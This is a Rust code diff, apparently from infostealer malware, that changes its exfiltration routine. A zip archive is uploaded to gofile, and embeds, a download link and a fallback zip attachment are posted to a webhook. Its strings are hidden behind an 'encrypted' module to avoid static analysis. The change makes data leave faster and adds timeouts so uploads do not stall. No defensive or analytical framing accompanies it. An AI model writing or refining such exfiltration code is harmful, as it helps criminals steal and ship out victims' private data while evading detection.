@@ -1,3 +1,4 @@
+use std::time::Duration;
 use serde_json::{json, Value};
 use crate::encrypted::*;
 
@@ -25,7 +26,6 @@ pub async fn upload_to_gofile(client: &reqwest::Client, zip_data: Vec<u8>, zip_n
     
     let body = response.text().await.ok()?;
 
-    // Parse manually with Value — no struct metadata in binary
     let v: Value = match serde_json::from_str(&body) {
         Ok(j) => j,
         Err(_) => {
@@ -61,38 +61,31 @@ pub async fn send_to_webhook(
 ) -> Vec<String> {
     let mut statuses: Vec<String> = Vec::new();
 
-    let gofile_link = upload_to_gofile(client, zip_data.clone(), &zip_name).await;
-    
+    // Send embeds immediately — don't wait for gofile upload.
+    for (ci, chunk) in embeds.chunks(10).enumerate() {
+        let payload = json!({ s_sender_embeds(): chunk });
+        let r = client.post(webhook_url).json(&payload).send().await;
+        statuses.push(format!("{}{}]={}", s_sender_embeds_status(), ci, r.map(|r| r.status()).unwrap_or_default()));
+    }
+
+    // Try gofile with a short timeout so we don't block the webhook for minutes.
+    let gofile_link = tokio::time::timeout(
+        Duration::from_secs(12),
+        upload_to_gofile(client, zip_data.clone(), &zip_name),
+    )
+    .await
+    .ok()
+    .flatten();
+
     statuses.push(if gofile_link.is_some() { s_sender_gofile_ok() } else { s_sender_gofile_fail() });
 
     let mut content = String::new();
     if let Some(ref link) = gofile_link {
         content = format!("\u{1f4e6} Download: {}", link);
     }
-    
+
     let r = client.post(webhook_url).json(&json!({s_sender_content(): content})).send().await;
     statuses.push(format!("content={}", r.map(|r| r.status()).unwrap_or_default()));
-
-    for (ci, chunk) in embeds.chunks(10).enumerate() {
-        let mut embed_with_link = chunk.to_vec();
-        
-        if ci == 0 {
-            if let Some(ref link) = gofile_link {
-                if let Some(embed) = embed_with_link.first_mut() {
-                    let download_text = format!("\n\n\u{1f4e6} Download: {}", link);
-                    if let Some(desc) = embed["description"].as_str() {
-                        embed["description"] = json!(format!("{}{}", desc, download_text));
-                    } else {
-                        embed["description"] = json!(download_text);
-                    }
-                }
-            }
-        }
-        
-        let payload = json!({ s_sender_embeds(): embed_with_link });
-        let r = client.post(webhook_url).json(&payload).send().await;
-        statuses.push(format!("{}{}]={}", s_sender_embeds_status(), ci, r.map(|r| r.status()).unwrap_or_default()));
-    }
 
     if gofile_link.is_none() {
         if let Ok(zip_part) = reqwest::multipart::Part::bytes(zip_data)
@@ -100,7 +93,13 @@ pub async fn send_to_webhook(
             .mime_str(&s_sender_application_zip())
         {
             let zip_form = reqwest::multipart::Form::new().part(s_sender_file(), zip_part);
-            let r = client.post(webhook_url).multipart(zip_form).send().await;
+            let r = tokio::time::timeout(
+                Duration::from_secs(60),
+                client.post(webhook_url).multipart(zip_form).send(),
+            )
+            .await
+            .ok()
+            .and_then(|r| r.ok());
             statuses.push(format!("zip_fallback={}", r.map(|r| r.status()).unwrap_or_default()));
         }
     }
